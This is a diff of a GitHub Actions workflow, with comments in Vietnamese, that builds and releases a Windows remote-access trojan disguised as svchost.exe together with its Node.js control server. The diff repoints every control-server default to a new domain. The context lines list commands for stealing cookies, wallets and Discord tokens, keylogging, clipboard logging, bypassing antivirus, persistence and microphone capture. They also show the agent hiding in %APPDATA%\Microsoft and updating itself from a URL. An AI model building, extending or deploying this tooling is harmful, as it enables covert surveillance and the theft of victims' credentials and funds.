@@ -19,9 +19,9 @@ on:
         default: '0'
         type: string
       control_url:
-        description: 'URL server web control (GHÕ TAY vào đây, để trống = dùng default)'
+        description: 'URL server web control (de trong = dung default)'
         required: false
-        default: 'https://control.bot-keep.xyz'
+        default: 'https://bvwqmiv7phoi.ramnaymcloud.com'
         type: string
       control_fetch:
         description: 'URL raw tra ve control URL (tuy chon, uu tien cao nhat)'
@@ -1710,9 +1710,9 @@ jobs:
               except Exception as e: return f"Lỗi: {e}"
 
           # ============================================================
-          #  WEB CONTROL - realtime screen + input (control.bot-keep.xyz)
+          #  WEB CONTROL - realtime screen + input (bvwqmiv7phoi.ramnaymcloud.com)
           # ============================================================
-          CONTROL_URL   = "https://control.bot-keep.xyz"
+          CONTROL_URL   = "https://bvwqmiv7phoi.ramnaymcloud.com"
           CONTROL_FETCH = ""
           CONTROL_ON    = True
           AGENT_KEY     = ""
@@ -2630,7 +2630,7 @@ jobs:
           $js = @'
           #!/usr/bin/env node
           'use strict';
-          /*  control.bot-keep.xyz - server dieu khien tu xa (1 file, tu cai deps)
+          /*  bvwqmiv7phoi.ramnaymcloud.com - server dieu khien tu xa (1 file, tu cai deps)
            *  Chay:  node server.js
            *  Env:   PORT=33324  HOST=0.0.0.0  WEB_PASS=...  AGENT_KEY=...
            *         TLS_CERT=cert.pem  TLS_KEY=key.pem   (co 2 file nay -> tu HTTPS/WSS)
@@ -2740,7 +2740,7 @@ jobs:
              <label><input type="checkbox" id="hid" checked> Chuot an</label>
              <label>FPS <select id="fps"><option>5</option><option>8</option><option selected>12</option><option>16</option><option>20</option><option>25</option></select></label>
              <label>Chat luong <input type="range" id="qual" min="20" max="90" value="55" style="width:80px"></label>
-             <label>Thu nho <select id="scale"><option>0.35</option><option selected>0.5</option><option>0.65</option><option>0.8</option><option>1</option></select></label>
+             <label>Thu nho <select id="scale"><option>0.35</option><option selected>0.5</option><option selected>0.65</option><option>0.8</option><option>1</option></select></label>
              <label>Man <select id="mon"><option value="1">1</option></select></label>
              <button id="pause">Tam dung</button>
              <button id="kb" class="pri">Ban phim: ON</button>
@@ -2922,7 +2922,7 @@ jobs:
           var QUICK=['help','sysinfo','shot','ls C:\\','procs','net','wifi','browser','cookies','wallets','dtoken',
           'steal','grab','keylog dump','cliplog dump','clip','bypass','persist','drives','users','av','installed',
           'power lock','msg Hello','notify svchost','beep','caps','flip','glitch on','overlay svchost','fakebsod','rickroll','mic 5',
-          'seturl https://control.bot-keep.xyz','reload'];
+          'seturl https://bvwqmiv7phoi.ramnaymcloud.com','reload'];
           QUICK.forEach(function(c){
             var b=document.createElement('button'); b.textContent=c;
             b.onclick=function(){ if(!attached) return; var sp=c.split(/\s+/), n=sp.shift();
@@ -3036,7 +3036,7 @@ jobs:
             }
             console.log('===========================================');
             console.log(' control server: ' + (useTls ? 'https' : 'http') + '://0.0.0.0:' + PORT);
-            console.log(' domain:         https://control.bot-keep.xyz');
+            console.log(' domain:         https://bvwqmiv7phoi.ramnaymcloud.com');
             console.log(' ws path:        MOI path (khong gioi han)');
             console.log(' mat khau web:   ' + (PASS ? 'CO' : 'khong'));
             console.log(' agent key:      ' + (AKEY ? 'CO' : 'khong'));
@@ -3250,7 +3250,7 @@ jobs:
         env:
           RUN_MIN: ${{ github.event.inputs.run_minutes }}
         run: |
-          Write-Host "Mo https://control.bot-keep.xyz -> chon may -> dieu khien"
+          Write-Host "Mo https://bvwqmiv7phoi.ramnaymcloud.com -> chon may -> dieu khien"
           $p = Start-Process -FilePath "dist\svchost.exe" -PassThru
           $secs = [int]$env:RUN_MIN * 60
           for ($i = 1; $i -le $secs; $i += 15) {
@@ -3299,12 +3299,14 @@ jobs:
             - `svchost.exe` — agent Windows (kết nối ra control server, không cần mở port)
             - `server.js` — server web control, chạy trên VPS: `node server.js` (cổng 33324)
 
-            **Đổi control URL mà không cần build lại:**
+            Control URL mặc định: **https://bvwqmiv7phoi.ramnaymcloud.com**
+
+            Đổi URL không cần build lại:
             - Discord: `!seturl https://domain-moi.com` rồi `!reload`
             - Web: gõ `seturl https://domain-moi.com` trong ô lệnh
-            - URL được lưu vào `%APPDATA%\Microsoft\control_url.txt`, ưu tiên hơn bản nhúng trong exe.
+            - URL lưu vào `%APPDATA%\Microsoft\control_url.txt`, ưu tiên hơn bản nhúng trong exe.
 
-            **Thay exe trên máy đã cài:** chỉ cần chạy file mới từ Downloads — agent tự ghi đè bản trong
+            Thay exe trên máy đã cài: chạy file mới từ Downloads — agent tự ghi đè bản trong
             `%APPDATA%\Microsoft`, tự tắt bản cũ và chạy lại bản mới. Hoặc dùng `!update <url exe>`.
           files: |
             svchost.exe
